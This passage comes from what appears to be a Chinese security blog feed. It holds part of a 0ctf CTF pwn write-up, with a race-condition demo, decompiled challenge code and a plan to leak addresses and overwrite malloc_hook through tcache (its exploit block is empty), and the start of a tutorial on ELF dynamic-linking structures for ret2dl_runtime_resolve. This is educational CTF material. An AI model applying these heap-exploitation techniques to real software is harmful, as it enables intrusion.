class="line">    pthread_create(&amp;id1, NULL, (void *)mythread1,NULL);  </span><br><span class="line">    pthread_create(&amp;id2, NULL, (void *)mythread2,NULL);  </span><br><span class="line">     </span><br><span class="line">    pthread_join(id1,NULL);  </span><br><span class="line">    pthread_join(id2,NULL);  </span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test  -lpthread        // linux 默认库不包含pthread，所以编译时需要添加lpthread</span><br><span class="line"></span><br><span class="line">$ ./test </span><br><span class="line">hack it!</span><br></pre></td></tr></table></figure><p>这个例子比较简单，但是很清晰，可以说是两个并发流同时访问了对象i ，在线程一还未结束时（sleep(3)），线程三同时访问对象i并修改了i的值从而影响了线程一。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>三个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1. Add task&quot;);</span><br><span class="line">  puts(&quot;2. Delete task&quot;);</span><br><span class="line">  puts(&quot;3. Go&quot;);</span><br><span class="line">  return printf(&quot;Choice: &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>add 功能： 先输入task id 与 加解密选择，然后malloc(0x70)的空间存放数据；之后进入加解密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;, 0LL);</span><br><span class="line">idx = get_num();</span><br><span class="line">printf(&quot;Encrypt(1) / Decrypt(2): &quot;);</span><br><span class="line">method = get_num();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall enc_dec(int method, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rsi</span><br><span class="line">  task *v4; // [rsp+0h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+14h] [rbp-1Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Key : &quot;, a2);</span><br><span class="line">  get_str2((__int64)v4-&gt;key, 32);</span><br><span class="line">  printf(&quot;IV : &quot;, 32LL);</span><br><span class="line">  get_str2((__int64)&amp;v4-&gt;IV, 16);</span><br><span class="line">  printf(&quot;Data Size : &quot;, 16LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = (unsigned int)get_num();</span><br><span class="line">  if ( (signed int)v5 &lt;= 0 || (signed int)v5 &gt; 0x1000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)&amp;v4-&gt;size = (signed int)v5;</span><br><span class="line">  *(_QWORD *)&amp;v4[1].key[8] = EVP_CIPHER_CTX_new();</span><br><span class="line"></span><br><span class="line">  if ( method == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_EncryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, (__int64)v4-&gt;key, (__int64)&amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( method != 2 )</span><br><span class="line">      return 0LL;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_DecryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, v4-&gt;key, &amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v4-&gt;method = method;</span><br><span class="line">  v4-&gt;ptr = (__int64)malloc(*(_QWORD *)&amp;v4-&gt;size);                                         </span><br><span class="line">  if ( !v4-&gt;ptr )</span><br><span class="line">    exit(1);</span><br><span class="line">  printf(&quot;Data : &quot;, v3);</span><br><span class="line">  get_str2(v4-&gt;ptr, *(_QWORD *)&amp;v4-&gt;size);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数就是对id还有一点数据检验之后将之前申请的chunk free</p><p>go函数 通过一点检查，之后创建线程将之前的输入的task 跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;);</span><br><span class="line"> v1 = get_num();</span><br><span class="line"> for ( arg = (void *)str; arg; arg = (void *)*((_QWORD *)arg + 13) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( v1 == *((_DWORD *)arg + 0x18) )</span><br><span class="line">   &#123;</span><br><span class="line">     pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, arg);</span><br><span class="line">     return __readfsqword(0x28u) ^ v4;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>重点的start routine函数,开始便sleep(2)，算是比较明显的条件竞争漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn start_routine(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  __int128 v2; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v3; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  puts(&quot;Prepare...&quot;);</span><br><span class="line">  sleep(2u);</span><br><span class="line">  memset(ptr_0, 0, 0x1010uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + 88),</span><br><span class="line">                        ptr_0,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,</span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + 8)) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + 88), (char *)ptr_0 + *((_QWORD *)&amp;v2 + 1), &amp;v1) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  puts(&quot;Ciphertext: &quot;);</span><br><span class="line">  sub_107B(stdout, (__int64)ptr_0, *((unsigned __int64 *)&amp;v2 + 1), 0x10uLL, 1uLL);</span><br><span class="line">  pthread_exit(0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>知道条件竞争漏洞的存在，可以利用其泄露地址；虽然是存在加解密过程，但是因为知道是AES_256_CBC 加密，同时python具有这个加密模块，所以这个可以解决</p><p>同时还需要的是写地址，在申请add task时 ，每个task 会得到四个chunk 第一个和第四个分别是结构体的存储与data的存储；<br>第二三个结构体是加解密申请的结构体，大小分别为0xb0 与 0x110，其中有存放指针，key， 加密后的data；</p><p>通过伪造加解密的结构及利用tcache的特点将chunk分配到malloc_hook并写入one_gadget；</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这次的0ctf真的溃不成军，看了一些题心态爆炸&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h1&gt;&lt;h2 id=&quot;题
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn1.4--ret2dl_runtime_resolve</title>
    <link href="http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/"/>
    <id>http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</id>
    <published>2019-03-19T23:12:54.000Z</published>
    <updated>2019-03-24T05:35:26.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。</p><p>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -d bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048624</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>节中包含目标文件的所有信息。节的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      // 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      // 节类型</span><br><span class="line">    Elf32_Word sh_flags;     // 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      // 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    // 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      // 节的长度</span><br><span class="line">    Elf32_Word sh_link;      // 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      // 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; // 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   // 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -S bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>几个重要的节：</p><ol><li>.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位</li></ol><p>ida 观察如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF REL Relocation Table /r_offset r_info</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;8049FFCh,  306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A040h,  905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A044h,  705h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:08048330 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch,  107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h,  207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048340                 Elf32_Rel &lt;804A014h,  407h&gt; ; R_386_JMP_SLOT strlen</span><br><span class="line">LOAD:08048348                 Elf32_Rel &lt;804A018h,  507h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048350                 Elf32_Rel &lt;804A01Ch,  607h&gt; ; R_386_JMP_SLOT write</span><br></pre></td></tr></table></figure><ol start="2"><li>.got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048380↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A01C _got_plt        ends</span><br></pre></td></tr></table></figure><ol start="3"><li>.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。</li></ol><p>而根据定义有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Section st_shndx; // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p><p>read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。</p><p>并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;</span><br><span class="line">LOAD:08048228                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:08048228                            0&gt;</span><br><span class="line">LOAD:08048238                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:08048248                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:08048248                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:08048258                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:08048258                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:08048268                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:08048268                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>.dynstr节包含了动态链接的字符串。这个节以\x00作为开始和结尾，中间每个字符串也以\x00间隔。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048278 ; ELF String Table</span><br><span class="line">LOAD:08048278 byte_8048278    db 0                    ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:08048278                                         ; LOAD:080481F8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &apos;strlen&apos;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &apos;setbuf&apos;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482B2                                         ; DATA XREF: LOAD:08048228↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &apos;write&apos;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br></pre></td></tr></table></figure><p>Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read。</p><ol start="5"><li>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</li></ol><h1 id="example"><a href="#example" class="headerlink" title="example"></a>example</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl 